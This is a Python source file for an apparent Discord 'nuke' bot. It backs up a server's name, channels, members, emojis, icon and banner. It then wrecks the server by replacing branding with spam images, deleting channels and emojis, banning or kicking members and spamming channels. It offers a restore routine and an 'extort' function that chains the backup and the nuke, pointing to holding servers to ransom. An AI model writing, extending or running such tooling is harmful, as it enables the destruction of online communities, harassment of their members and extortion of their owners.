from utils import *
import shelve


async def backup(guild):
    categories, text_channels, voice_channels, members, icon, banner, emojis = await serialize_server_info(guild)
    d = shelve.open(str(guild.id))
    d['name'], d['owner'], d['emojis'], d['categories'], d['text_channels'], d['voice_channels'], d['members'], d['member_count'], d['icon'], d['banner'] = guild.name, guild.owner.name, emojis, categories, text_channels, voice_channels, members, guild.member_count, icon, banner
    d.close()


async def nuke(guild):
    owner = guild.owner
    print(f'Nuking: {guild.name}\nOwned by: {owner.name}\nMembers: {len(guild.members)}')
    if b_replace_icon:
        with open('spam_img.png', 'rb') as pic:
            icon = pic.read()
            pic.close()
        await guild.edit(icon=icon)
    if b_replace_banner and guild.banner:
        with open('spam_img.png', 'rb') as pic:
            banner = pic.read()
            pic.close()
        await guild.edit(banner=banner)
    if b_replace_name:
        await guild.edit(name=new_server_name)
    if b_delete_text_channels or b_delete_voice_channels or b_delete_categories:
        await delete_channels(guild)
    if b_ban_users or b_kick_users:
        await ban_or_kick(guild)
    if b_delete_emojis:
        await delete_emojis(guild)
    # if b_delete_stickers: Stickers can't be restored as of now, so dont delete them
    #    await delete_stickers(guild)
    if b_create_text_channels or b_create_voice_channels or b_create_categories:
        await create_channels(guild)
    if b_spam_text_channels or b_spam_images:
        await spam(guild)


async def restore(guild):
    d = shelve.open(str(guild.id))
    if guild.name != d['name']:
        await guild.edit(name=d['name'])
    await replace_emojis(guild, d)
    await replace_categories(guild, d)
    await replace_text_channels(guild, d)
    await replace_voice_channels(guild, d)
    await invite_members(guild, d)
    if await guild.icon.read() != d['icon']:
        await guild.edit(icon=d['icon'])
    if guild.banner and guild.banner.read() != d['banner']:
        await guild.edit(banner=d['banner'])


async def extort(guild):
    await backup(guild)
    await nuke(guild)
